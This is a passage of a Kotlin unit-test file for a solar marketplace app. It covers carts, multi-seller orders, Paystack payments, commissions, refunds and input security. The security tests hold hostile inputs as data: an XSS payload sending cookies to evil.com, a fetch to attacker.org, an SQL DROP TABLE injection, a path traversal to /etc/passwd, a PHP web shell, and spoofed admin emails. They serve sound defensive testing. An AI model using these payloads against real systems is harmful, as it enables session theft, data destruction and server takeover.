        assertTrue(deyeProducts.all { it.brand.contains("Deye", ignoreCase = true) })

        // 3. Test Location Filter ("Abuja")
        vm.resetAllFilters()
        vm.selectLocation("Abuja")
        val abujaProducts = vm.getFilteredProducts()
        assertTrue(abujaProducts.isNotEmpty())
        assertTrue(abujaProducts.all { it.sellerLocation.contains("Abuja", ignoreCase = true) })

        // 4. Test Verified Seller Filter + Price Sort (Low -> High)
        vm.resetAllFilters()
        vm.setCertifiedFilter(true)
        vm.selectSortOption(com.example.data.model.ProductSortOption.PRICE_LOW_TO_HIGH)
        val sortedVerified = vm.getFilteredProducts()
        assertTrue(sortedVerified.isNotEmpty())
        assertTrue(sortedVerified.all { it.isCertifiedSeller })
        for (i in 0 until sortedVerified.size - 1) {
            assertTrue(sortedVerified[i].basePriceNgn <= sortedVerified[i + 1].basePriceNgn)
        }
        vm.resetAllFilters()

        // 5. Test Related Products discovery
        val targetInverter = vm.products.value.first { it.id == "prod_deye_5kw" }
        val related = vm.getRelatedProducts(targetInverter)
        assertTrue(related.isNotEmpty())
        assertTrue(related.none { it.id == targetInverter.id })
        assertEquals(targetInverter.category, related.first().category)

        // 6. Test Multi-Seller Cart: add products from 3 different sellers
        vm.clearCart()
        val nekesProduct = vm.products.value.first {
            it.storeId == "store_nekes" && it.inStock && it.category == com.example.data.model.ProductCategory.PANELS
        }
        val felicityProduct = vm.products.value.first { it.storeId == "store_felicity" && it.inStock && it.stockCount >= 1 }
        val deyeHubProduct = vm.products.value.first { it.storeId == "store_deye" && it.inStock && it.stockCount >= 1 }

        vm.addToCart(nekesProduct)     // store_nekes (185,000)
        vm.addToCart(felicityProduct)  // store_felicity (1,450,000)
        vm.addToCart(deyeHubProduct)   // store_deye (1,120,000)

        // Adjust quantity of NEKES panel to 2
        vm.updateCartItemQuantity(nekesProduct.id, 1)
        assertEquals(4, vm.getTotalCartItemsCount())

        // Remove Deye Hub product explicitly using removeCartItem
        vm.removeCartItem(deyeHubProduct.id)
        assertEquals(3, vm.getTotalCartItemsCount())
        assertEquals(2, vm.cartItems.value.size)

        // Verify Multi-Seller Cart Breakdown (2 sellers: store_nekes & store_felicity)
        val breakdown = vm.getCartBreakdown()
        assertEquals(2, breakdown.totalSellersCount)
        assertEquals(3, breakdown.totalItemsCount)
        val expectedNekesSub = nekesProduct.basePriceNgn * 2 // 370,000
        val expectedFelicitySub = felicityProduct.basePriceNgn * 1 // 1,450,000
        val expectedSubtotal = expectedNekesSub + expectedFelicitySub // 1,820,000
        val expectedDelivery = 15000L * 2 // 30,000 (15,000 per seller store leg)
        assertEquals(expectedSubtotal, breakdown.subtotalNgn)
        assertEquals(expectedDelivery, breakdown.totalDeliveryCostNgn)
        assertTrue(breakdown.totalSolarfixCommissionNgn > 0L)
        assertEquals(expectedSubtotal + expectedDelivery, breakdown.finalOrderTotalNgn)

        // 7. Place Multi-Seller Order -> verify separate seller fulfilment records & order breakdowns
        val nekesEscrowBefore = vm.stores.value.first { it.id == "store_nekes" }.pendingEscrowNgn
        val felicityEscrowBefore = vm.stores.value.first { it.id == "store_felicity" }.pendingEscrowNgn

        vm.confirmAndPlaceOrder(
            customerName = "Chief Adebayo",
            customerEmail = "adebayo@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD
        )

        val placedOrders = vm.lastPlacedOrders.value
        assertEquals("Multi-seller cart with 2 sellers must create 2 separate fulfilment orders", 2, placedOrders.size)
        val sharedGroupId = placedOrders.first().checkoutGroupId
        org.junit.Assert.assertNotNull(sharedGroupId)
        assertTrue(placedOrders.all { it.checkoutGroupId == sharedGroupId })
        assertTrue(placedOrders.all { it.sellerFulfilments.size == 2 })

        val nekesOrder = placedOrders.first { it.primaryStoreId == "store_nekes" }
        val felicityOrder = placedOrders.first { it.primaryStoreId == "store_felicity" }
        assertEquals(expectedNekesSub, nekesOrder.subtotalNgn)
        assertEquals(15000L, nekesOrder.deliveryFeeNgn)
        assertEquals(expectedFelicitySub, felicityOrder.subtotalNgn)
        assertEquals(15000L, felicityOrder.deliveryFeeNgn)

        val nekesEscrowAfter = vm.stores.value.first { it.id == "store_nekes" }.pendingEscrowNgn
        val felicityEscrowAfter = vm.stores.value.first { it.id == "store_felicity" }.pendingEscrowNgn
        assertEquals(nekesEscrowBefore + nekesOrder.netSellerEarningsNgn, nekesEscrowAfter)
        assertEquals(felicityEscrowBefore + felicityOrder.netSellerEarningsNgn, felicityEscrowAfter)
    }

    @Test
    fun testPrePurchaseConfirmationValidationAndIntegrity() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)

        val testProd = com.example.data.model.MarketplaceProduct(
            id = "prod_test_integrity_guard",
            title = "Test Integrity Solar Panel 400W",
            category = com.example.data.model.ProductCategory.PANELS,
            brand = "TestOEM",
            modelNumber = "TEST-400W",
            powerRating = "400 Watts",
            voltage = "24V System",
            basePriceNgn = 120000L,
            rating = 5.0f,
            reviewsCount = 1,
            badge = "VERIFIED SELLER",
            inStock = true,
            specs = mapOf("Watts" to "400W"),
            description = "Test description",
            sellerName = "NEKES Solar Energy Store",
            sellerLocation = "Lagos",
            isCertifiedSeller = true,
            condition = "Brand New",
            storeId = "store_nekes",
            warrantyPeriod = "2 Years",
            stockCount = 10
        )
        repo.addOrUpdateProduct(testProd)

        vm.clearCart()
        vm.addToCart(testProd)
        assertEquals(1, vm.cartItems.value.size)

        // 1. Initial Cart Validation passes
        val initialIssues = vm.getCartValidationIssues()
        assertTrue("Cart should initially be valid", initialIssues.isEmpty())

        // 2. Simulate Catalog Price Change
        val originalPrice = testProd.basePriceNgn
        val updatedProduct = testProd.copy(basePriceNgn = originalPrice + 50000L)
        repo.addOrUpdateProduct(updatedProduct)

        // Cart validation must detect the price update and block checkout
        val issuesAfterPriceChange = vm.getCartValidationIssues()
        assertTrue("Cart validation must detect catalog price change", issuesAfterPriceChange.isNotEmpty())
        assertTrue(issuesAfterPriceChange.any { it.contains("Price update") || it.contains("Price changed") })

        // Attempting to place order while price is mismatched must be blocked
        vm.confirmAndPlaceOrder(
            customerName = "Mr. Test",
            customerEmail = "test@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD
        )
        assertTrue("Order must not be placed when price mismatch exists", vm.lastPlacedOrders.value.isEmpty())

        // 3. Synchronize Cart Prices
        val notices = vm.refreshCartPricesAndStock()
        assertTrue(notices.isNotEmpty())
        assertEquals(updatedProduct.basePriceNgn, vm.cartItems.value.first().product.basePriceNgn)
        assertTrue("Cart should be valid after synchronizing prices", vm.getCartValidationIssues().isEmpty())

        // 4. Simulate Stock Depletion
        val outOfStockProduct = updatedProduct.copy(stockCount = 0, inStock = false)
        repo.addOrUpdateProduct(outOfStockProduct)

        val issuesAfterStockDepleted = vm.getCartValidationIssues()
        assertTrue("Cart validation must detect out of stock product", issuesAfterStockDepleted.isNotEmpty())
        assertTrue(issuesAfterStockDepleted.any { it.contains("OUT OF STOCK") })

        // 5. Restore product stock and verify order completion
        val restoredProduct = outOfStockProduct.copy(stockCount = 10, inStock = true)
        repo.addOrUpdateProduct(restoredProduct)
        vm.refreshCartPricesAndStock()
        assertTrue(vm.getCartValidationIssues().isEmpty())

        vm.confirmAndPlaceOrder(
            customerName = "Mr. Test",
            customerEmail = "test@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD
        )
        assertTrue("Order must succeed once cart integrity is valid", vm.lastPlacedOrders.value.isNotEmpty())

        // Clean up test product
        repo.deleteProductListing("prod_test_integrity_guard")
        vm.clearCart()
    }

    @Test
    fun testExpensiveEquipmentVerificationInquirySubmission() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)

        val expensiveProduct = vm.products.value.first { it.basePriceNgn >= 500_000L }
        val inquiry = vm.requestExpensiveEquipmentVerification(
            productId = expensiveProduct.id,
            requestType = "Live Warehouse Packaging & Serial Plate Photograph",
            notes = "Please provide high-resolution photo of OEM warranty barcode and terminal studs.",
            contact = "+234 803 700 9999"
        )

        org.junit.Assert.assertNotNull(inquiry.id)
        assertEquals(expensiveProduct.id, inquiry.productId)
        assertEquals(expensiveProduct.title, inquiry.productTitle)
        assertEquals(expensiveProduct.storeId, inquiry.storeId)
        assertEquals("Live Warehouse Packaging & Serial Plate Photograph", inquiry.requestType)
        assertEquals("+234 803 700 9999", inquiry.customerContact)
        assertEquals("PENDING_SELLER_CONFIRMATION", inquiry.status)
        assertTrue(vm.prePurchaseInquiries.value.any { it.id == inquiry.id })
    }

    @Test
    fun testOrderConfirmationRequiredFields() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)

        vm.clearCart()
        val testProd = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(testProd)

        val item = vm.cartItems.value.first()
        // Verify all required confirmation fields are non-empty
        assertTrue(item.product.title.isNotBlank())
        assertTrue(item.product.powerRating.isNotBlank())
        assertTrue(item.product.voltage.isNotBlank())
        assertTrue(item.product.sellerName.isNotBlank())
        assertTrue(item.product.warrantyPeriod.isNotBlank())
        assertTrue(item.product.returnPolicy.isNotBlank())
        assertTrue(item.quantity > 0)
        assertTrue(item.product.basePriceNgn > 0L)

        val breakdown = vm.getCartBreakdown()
        assertTrue(breakdown.subtotalNgn > 0L)
        assertTrue(breakdown.totalDeliveryCostNgn > 0L)
        assertTrue(breakdown.finalOrderTotalNgn == breakdown.subtotalNgn + breakdown.totalDeliveryCostNgn)

        val address = vm.addresses.value.first()
        assertTrue(address.recipientName.isNotBlank())
        assertTrue(address.phone.isNotBlank())
        assertTrue(address.streetAddress.isNotBlank())
        assertTrue(address.city.isNotBlank())
        assertTrue(address.state.isNotBlank())
        vm.clearCart()
    }

    @Test
    fun testServerSidePaymentVerificationAndOrderPlacement() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)
        vm.clearCart()

        val prod = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(prod)

        val breakdown = vm.getCartBreakdown()
        val expectedKobo = breakdown.finalOrderTotalNgn * 100L

        // 1. Initialize official Paystack transaction
        val init = vm.initializePaymentForCart("customer@solarfix.africa", "card")
        assertTrue(init.reference.startsWith("SF-PAY-"))
        assertTrue(init.authorizationUrl.isNotBlank())

        // 2. Server-side verification confirms payment against Paystack gateway
        val verif = vm.verifyPaymentOnServer(init.reference, expectedKobo)
        assertTrue("Backend verification must succeed with correct order amount", verif.isVerified)
        assertEquals(com.example.data.payment.GatewayPaymentStatus.SUCCESS, verif.status)
        assertEquals(expectedKobo, verif.amountKobo)

        // 3. Place order with verified reference
        vm.confirmAndPlaceOrder(
            customerName = "Engr. Chukwuma",
            customerEmail = "chukwuma@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD,
            paymentReference = init.reference
        )

        assertTrue(vm.lastPlacedOrders.value.isNotEmpty())
        val placed = vm.lastPlacedOrders.value.first()
        assertEquals(init.reference, placed.paymentReference)
        assertTrue(placed.isGatewayVerified)
        assertTrue(placed.gatewayVerificationId != null)

        vm.clearCart()
    }

    @Test
    fun testDuplicatePaymentReferencePrevention() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)
        vm.clearCart()

        val prod = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(prod)

        val init = vm.initializePaymentForCart("customer@solarfix.africa", "card")

        // First order placement succeeds
        vm.confirmAndPlaceOrder(
            customerName = "Mr. Test",
            customerEmail = "test@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD,
            paymentReference = init.reference
        )
        assertTrue(vm.lastPlacedOrders.value.isNotEmpty())

        // Attempting to reuse the exact same payment reference for another order must be blocked
        vm.addToCart(prod)
        val duplicateOrders = repo.placeMultiSellerOrders(
            customerName = "Attacker Replay",
            customerEmail = "attacker@test.com",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD,
            paymentReference = init.reference
        )
        assertTrue("Duplicate payment reference must be blocked by gateway guard", duplicateOrders.isEmpty())

        vm.clearCart()
    }

    @Test
    fun testStrictPaymentAmountMatching() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)
        vm.clearCart()

        val prod = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(prod)

        val breakdown = vm.getCartBreakdown()
        val actualKobo = breakdown.finalOrderTotalNgn * 100L
        val mismatchedKobo = actualKobo - 5000000L // 50,000 NGN less

        val init = vm.initializePaymentForCart("customer@solarfix.africa", "card")

        // Verifying with wrong expected amount fails
        val verif = vm.verifyPaymentOnServer(init.reference, expectedAmountKobo = mismatchedKobo)
        org.junit.Assert.assertFalse("Amount mismatch must fail server verification", verif.isVerified)

        vm.clearCart()
    }

    @Test
    fun testWebhookProcessingWithHmacSignature() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)

        val reference = com.example.data.payment.PaystackPaymentGatewayManager.generateUniquePaymentReference()

        // Valid HMAC signature simulation verified against backend PAYSTACK_SECRET_KEY
        val validResult = vm.simulateIncomingWebhook(reference, "charge.success")
        assertTrue(validResult.isVerified)
        assertEquals(com.example.data.payment.GatewayPaymentStatus.SUCCESS, validResult.status)

        // Invalid signature test directly on gateway using PAYSTACK_SECRET_KEY
        val rawPayload = """{"event":"charge.success","data":{"reference":"$reference","amount":100000}}"""
        val invalidSignature = "invalid_hmac_hex_hash_12345"
        val isInvalidRejected = repo.paymentGateway.verifyHmacSha512(rawPayload, invalidSignature)
        org.junit.Assert.assertFalse("Forged webhook signature must be rejected by backend", isInvalidRejected)

        // Valid signature computed with PAYSTACK_SECRET_KEY matching x-paystack-signature
        val authenticSignature = repo.paymentGateway.computeHmacSha512(rawPayload)
        val isAuthenticValid = repo.paymentGateway.verifyHmacSha512(rawPayload, authenticSignature)
        assertTrue("Authentic signature hashed with PAYSTACK_SECRET_KEY must be valid", isAuthenticValid)
    }

    @Test
    fun testMarketplacePaymentSplittingAndSubaccounts() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)

        val subaccounts = vm.sellerSubaccounts.value
        assertTrue("Approved sellers should have marketplace subaccounts", subaccounts.isNotEmpty())

        val nekesSub = subaccounts.values.first { it.storeId == "store_nekes" || it.businessName.contains("NEKES", ignoreCase = true) }
        assertEquals(2.0, nekesSub.percentageCharge, 0.01) // 2.0% default SolarFix commission
        assertTrue(nekesSub.subaccountCode.startsWith("ACCT_"))
        assertTrue(nekesSub.settlementBank.isNotBlank())
        assertTrue(nekesSub.accountNumber.isNotBlank())
    }

    @Test
    fun testAdministratorCommissionAndSellerPayouts() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)
        vm.clearCart()

        // 1. Verify Default Global Commission (2.0% SolarFix, 98.0% Seller Proceeds)
        val defaultSettings = vm.settings.value
        assertEquals(2.0, defaultSettings.defaultCommissionPercent, 0.01)

        val sampleProd = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(sampleProd)

        val breakdown = repo.calculateCartBreakdown()
        val sellerBreakdown = breakdown.sellerBreakdowns.first()
        assertEquals(2.0, sellerBreakdown.commissionRatePercent, 0.01)
        val expectedCommission = (sellerBreakdown.sellerSubtotalNgn * 0.02).toLong()
        assertEquals(expectedCommission, sellerBreakdown.solarfixCommissionNgn)
        assertEquals(sellerBreakdown.sellerSubtotalNgn - expectedCommission, sellerBreakdown.netSellerPayoutNgn)

        // 2. Override Individual Seller Commission (e.g. 1.5% for specific store)
        vm.setSellerCustomCommission(sellerBreakdown.storeId, 1.5)
        val customBreakdown = repo.calculateCartBreakdown()
        val customSellerBreakdown = customBreakdown.sellerBreakdowns.first { it.storeId == sellerBreakdown.storeId }
        assertEquals(1.5, customSellerBreakdown.commissionRatePercent, 0.01)

        // 3. Test Withdrawal Guards: Pending escrow locked, cannot withdraw > available balance
        val store = vm.stores.value.first { it.id == sellerBreakdown.storeId }
        val invalidWithdrawalOverBalance = repo.requestSellerWithdrawal(
            storeId = store.id,
            amountNgn = store.availableEarningsNgn + 1000000L,
            bankName = "GTBank",
            accountNumber = "0123456789",
            accountName = store.storeName
        )
        org.junit.Assert.assertNull("Seller must not be allowed to withdraw more than available balance", invalidWithdrawalOverBalance)

        // Valid withdrawal within available balance
        val testPayoutAmt = store.availableEarningsNgn.coerceAtMost(500000L).coerceAtLeast(100000L)
        val validReq = repo.requestSellerWithdrawal(
            storeId = store.id,
            amountNgn = testPayoutAmt,
            bankName = "GTBank",
            accountNumber = "0123456789",
            accountName = store.storeName
        )
        org.junit.Assert.assertNotNull("Valid withdrawal within available balance should succeed", validReq)
        assertEquals(com.example.data.model.WithdrawalStatus.PENDING, validReq!!.status)

        // Admin approves withdrawal
        repo.processWithdrawalRequest(validReq.id, approve = true)
        val approvedReq = repo.withdrawalsFlow.value.find { it.id == validReq.id }
        assertEquals(com.example.data.model.WithdrawalStatus.APPROVED_PAID, approvedReq?.status)

        vm.clearCart()
    }

    @Test
    fun testRefundHandlingAndReconciliationBalance() {
        val repo = SolarRepository()
        val vm = com.example.ui.viewmodel.MarketplaceViewModel(repo)
        vm.clearCart()

        val prod = vm.products.value.first { it.isActive && it.inStock && it.stockCount > 0 }
        vm.addToCart(prod)

        val init = vm.initializePaymentForCart("customer@solarfix.africa", "card")
        vm.confirmAndPlaceOrder(
            customerName = "Alhaji Bello",
            customerEmail = "bello@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD,
            paymentReference = init.reference
        )

        val order = vm.lastPlacedOrders.value.first()
        // Process refund
        val refundRecord = vm.processRefundForOrder(order.id, "Pre-dispatch inspection defect")
        org.junit.Assert.assertNotNull(refundRecord)
        assertEquals("SUCCESS", refundRecord!!.status)
        assertEquals(order.totalAmountNgn, refundRecord.amountNgn)
        assertEquals(order.totalAmountNgn * 100L, refundRecord.amountKobo)
        assertTrue(vm.refundRecords.value.any { it.refundId == refundRecord.refundId })

        // Generate reconciliation report
        val recon = vm.generateReconciliationReport()
        org.junit.Assert.assertNotNull(recon)
        assertEquals(com.example.data.payment.ReconciliationStatus.BALANCED, recon.status)
        assertEquals(0L, recon.discrepancyKobo)
        assertTrue(recon.grossVolumeKobo > 0L)
        assertTrue(recon.netSellerPayoutKobo > 0L)
        assertTrue(recon.solarfixCommissionKobo > 0L)

        vm.clearCart()
    }

    @Test
    fun testPrivilegeEscalationEmailBypassBlocked() {
        // Legitimate owner and platform admin emails must still be authorized
        assertTrue(com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("nekeskingsley@gmail.com"))
        assertTrue(com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("admin@solarfix.africa"))
        assertTrue(com.example.data.repository.AuthRepository.isAppOwnerOrAdminEmail("nekeskingsley@gmail.com"))
        assertTrue(com.example.data.repository.AuthRepository.isAppOwnerOrAdminEmail("admin@solarfix.africa"))

        // Spoofed prefix/substring emails must be strictly denied (VULN-01 fix verification)
        val spoofedEmails = listOf(
            "nekeskingsley@attacker.com",
            "nekeskingsley@evil.org",
            "admin@attacker.com",
            "myadmin@gmail.com",
            "sub_admin@solarfix.africa",
            "fake.admin@yahoo.com"
        )
        spoofedEmails.forEach { spoofed ->
            org.junit.Assert.assertFalse(
                "Spoofed email '$spoofed' must NOT be granted admin clearance in FirebaseAuthAdminHandler",
                com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail(spoofed)
            )
            org.junit.Assert.assertFalse(
                "Spoofed email '$spoofed' must NOT be granted admin clearance in AuthRepository",
                com.example.data.repository.AuthRepository.isAppOwnerOrAdminEmail(spoofed)
            )
        }
    }

    @Test
    fun testPbkdf2PasswordHashingAndConstantTimeVerification() {
        val rawPassword = "SolarFix#Secure!2026"
        val hash1 = com.example.util.SecuritySanitizer.hashPassword(rawPassword)
        val hash2 = com.example.util.SecuritySanitizer.hashPassword(rawPassword)

        // Verify PBKDF2 format, non-plaintext storage, and unique per-hash cryptographic salt
        assertTrue(com.example.util.SecuritySanitizer.isPasswordHashed(hash1))
        org.junit.Assert.assertFalse("Password hash must never contain raw password", hash1.contains(rawPassword))
        org.junit.Assert.assertNotEquals("Each hash call must generate a unique random salt", hash1, hash2)

        // Verify correct password passes and wrong password fails
        assertTrue(com.example.util.SecuritySanitizer.verifyPassword(rawPassword, hash1))
        assertTrue(com.example.util.SecuritySanitizer.verifyPassword(rawPassword, hash2))
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.verifyPassword("WrongPassword123", hash1))
    }

    @Test
    fun testXssAndSqlInjectionSanitization() {
        val xssPayload = "<script>window.location='https://evil.com?c='+document.cookie</script>Felicity 5kVA <img src=x onerror=\"alert(1)\"> javascript:alert(1)"
        val sanitized = com.example.util.SecuritySanitizer.sanitizeText(xssPayload)

        org.junit.Assert.assertFalse(sanitized.contains("<script", ignoreCase = true))
        org.junit.Assert.assertFalse(sanitized.contains("onerror", ignoreCase = true))
        org.junit.Assert.assertFalse(sanitized.contains("javascript:", ignoreCase = true))
        org.junit.Assert.assertFalse(sanitized.contains("<script>"))
        assertTrue(sanitized.contains("Felicity 5kVA"))

        val sqliPayload = "Growatt Inverter'; DROP TABLE chat_messages; --"
        assertTrue(com.example.util.SecuritySanitizer.containsDangerousPayload(sqliPayload))
        val cleanedSql = com.example.util.SecuritySanitizer.sanitizeText(sqliPayload)
        org.junit.Assert.assertFalse(cleanedSql.contains("DROP TABLE", ignoreCase = true))
    }

    @Test
    fun testNonDestructiveSolarProductDescriptionSanitization() {
        // Legitimate solar engineering product description containing '<', '>', '%', '₦', '°C', '&', quotes, and multiline bullets
        val legitimateSolarDesc = """
            Deye 8kW Hybrid Inverter (SUN-8K-SG01LP1-EU) — Pure Sine Wave:
            • Total Harmonic Distortion (THD) < 3% & Peak Conversion Efficiency > 97.6%
            • Battery Voltage Range: 40V – 60V DC (48V Nominal LiFePO4 & Tubular Lead-Acid)
            • Operating Temperature: -25°C to +60°C (Derating > 45°C)
            • Recommended Retail Price: ₦1,850,000 (Includes 100A MPPT & Wi-Fi Dongle)
        """.trimIndent()

        val cleanedLegitimate = com.example.util.SecuritySanitizer.sanitizeRichDescription(legitimateSolarDesc)

        // Verify legitimate engineering notation and symbols are NOT mangled or stripped
        assertTrue("Must preserve '< 3%' mathematical inequality", cleanedLegitimate.contains("< 3%"))
        assertTrue("Must preserve '> 97.6%' mathematical inequality", cleanedLegitimate.contains("> 97.6%"))
        assertTrue("Must preserve '> 45°C' temperature comparison", cleanedLegitimate.contains("> 45°C"))
        assertTrue("Must preserve ampersand '&'", cleanedLegitimate.contains("THD) < 3% & Peak"))
        assertTrue("Must preserve Naira currency symbol '₦'", cleanedLegitimate.contains("₦1,850,000"))
        assertTrue("Must preserve multiline formatting", cleanedLegitimate.contains("\n"))

        // Verify that malicious script tags embedded inside a legitimate description ARE stripped without destroying surrounding specs
        val mixedPayload = "$legitimateSolarDesc\n<script>fetch('https://attacker.org/steal')</script><iframe src=\"javascript:alert(1)\"></iframe>"
        val cleanedMixed = com.example.util.SecuritySanitizer.sanitizeRichDescription(mixedPayload)
        org.junit.Assert.assertFalse("Embedded <script> must be stripped", cleanedMixed.contains("<script", ignoreCase = true))
        org.junit.Assert.assertFalse("Embedded <iframe> must be stripped", cleanedMixed.contains("<iframe", ignoreCase = true))
        assertTrue("Legitimate '< 3%' must still be preserved after stripping XSS tags", cleanedMixed.contains("< 3%"))
        assertTrue("Legitimate '> 97.6%' must still be preserved after stripping XSS tags", cleanedMixed.contains("> 97.6%"))
    }

    @Test
    fun testFileUploadAndNubanAndPaymentSecurityBounds() {
        // 1. File upload extension & path traversal checks
        assertTrue(com.example.util.SecuritySanitizer.validateFileNameAndExtension("cac_certificate.jpg").isValid)
        assertTrue(com.example.util.SecuritySanitizer.validateFileNameAndExtension("premises_photo.png").isValid)
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.validateFileNameAndExtension("../../etc/passwd.jpg").isValid)
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.validateFileNameAndExtension("shell.php.jpg").isValid)
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.validateFileNameAndExtension("xss_vector.svg").isValid)
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.validateFileNameAndExtension("malware.apk").isValid)

        // 2. Binary Image Magic-Bytes Header Validation (JPEG, PNG, WEBP vs disguised executable)
        val validJpegHeader = byteArrayOf(
            0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(),
            0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01
        )
        val validPngHeader = byteArrayOf(
            0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D
        )
        val disguisedScriptHeader = "<?php system(\$_GET['cmd']); ?>".toByteArray()

        assertTrue(com.example.util.SecuritySanitizer.validateImageMagicBytes(validJpegHeader).isValid)
        assertTrue(com.example.util.SecuritySanitizer.validateImageMagicBytes(validPngHeader).isValid)
        org.junit.Assert.assertFalse(
            "Disguised PHP/script payload must fail binary magic-byte inspection",
            com.example.util.SecuritySanitizer.validateImageMagicBytes(disguisedScriptHeader).isValid
        )

        // 3. Nigerian 10-digit NUBAN validation and withdrawal bounds
        assertTrue(com.example.util.SecuritySanitizer.isValidNubanAccountNumber("0123456789"))
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.isValidNubanAccountNumber("12345"))
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.isValidNubanAccountNumber("01234ABC89"))

        val repo = SolarRepository()
        // Negative payment verification must be rejected
        val negPayment = repo.paymentGateway.verifyPaymentOnServer(
            reference = "SF-PAY-NEG-TEST",
            expectedOrderTotalNgn = -50000L,
            customerEmail = "buyer@solarfix.africa",
            customerName = "Buyer"
        )
        org.junit.Assert.assertFalse("Negative payment amount must be rejected", negPayment.success)

        // Invalid NUBAN withdrawal must be rejected
        val badNubanWithdrawal = repo.requestSellerWithdrawal(
            storeId = "store_nekes",
            amountNgn = 50000L,
            bankName = "GTBank",
            accountNumber = "12345_BAD",
            accountName = "NEKES Solar"
        )
        org.junit.Assert.assertNull("Invalid NUBAN account number must be rejected on withdrawal", badNubanWithdrawal)
    }

    @Test
    fun testAll14InputValidationSchemasAndSafeOutputEncoding() {
        // 1. Registration Form Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateRegistrationInput(
                name = "Engr. Chinedu Okafor",
                email = "chinedu@solarfix.africa",
                password = "Solar#2026!Secure"
            ).isValid
        )
        org.junit.Assert.assertFalse(
            com.example.util.SecuritySanitizer.validateRegistrationInput(
                name = "Engr. Chinedu",
                email = "invalid-email",
                password = "Solar#2026!Secure"
            ).isValid
        )

        // 2. Login Form Schema
        assertTrue(com.example.util.SecuritySanitizer.validateLoginInput("chinedu@solarfix.africa", "Solar#2026!Secure").isValid)
        org.junit.Assert.assertFalse(
            com.example.util.SecuritySanitizer.validateLoginInput("not_an_email_without_at", "pass").isValid
        )

        // 3. Password Reset Form Schema
        assertTrue(com.example.util.SecuritySanitizer.validatePasswordResetInput("chinedu@solarfix.africa").isValid)
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.validatePasswordResetInput("not_an_email").isValid)

        // 4. Solar Profile Information Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateSolarProfileInput(
                systemSizeKva = 5.0,
                batteryType = "48V LiFePO4 Lithium",
                batteryCapacityKwh = 10.24,
                solarPanelWatts = 4400,
                installerName = "SolarFix Certified Team"
            ).isValid
        )
        org.junit.Assert.assertFalse(
            "Out-of-bounds system size (0.0 kVA) must be rejected by profile schema",
            com.example.util.SecuritySanitizer.validateSolarProfileInput(
                systemSizeKva = 0.0,
                batteryType = "48V LiFePO4 Lithium",
                batteryCapacityKwh = 10.24,
                solarPanelWatts = 4400,
                installerName = "SolarFix Certified Team"
            ).isValid
        )

        // 5. Seller Registration & KYB Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateSellerRegistrationInput(
                businessName = "SunPeak Energy Ltd",
                businessPhone = "+2348091112233",
                businessEmail = "musa@sunpeak.ng",
                physicalAddress = "Plot 14 Admiralty Way, Lekki Phase 1",
                city = "Lagos",
                state = "Lagos State",
                businessDescription = "Authorized Tier-1 Hybrid Inverter & LiFePO4 Distributor",
                idDocumentType = "NIN / CAC Certificate",
                idDocumentNumber = "RC-1928374",
                bankAccountName = "SunPeak Energy Ltd",
                bankName = "Zenith Bank",
                bankAccountNumber = "0123456789"
            ).isValid
        )

        // 6 & 7. Product Name & Product Description Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateProductInput(
                title = "Felicity 10kWh LiFePO4 Wall Battery (LPBF48200)",
                brand = "Felicity Solar",
